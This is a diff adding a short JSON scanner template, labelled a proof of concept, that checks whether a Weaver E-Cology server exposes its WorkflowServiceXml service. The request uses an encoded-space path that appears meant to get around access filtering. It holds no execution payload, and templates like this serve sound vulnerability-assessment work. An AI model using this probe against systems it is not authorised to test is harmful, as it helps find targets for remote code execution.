@@ -1,0 +1,19 @@
+{
+  "poc": "泛微-E-Cology WorkflowServiceXml RCE",
+  "req":[
+    {
+      "method": "GET",
+      "uri": "/services%20/WorkflowServiceXml",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": ""
+      },
+      "data": "",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["Invalid SOAP request"]
+      }
+    }
+  ]
+}
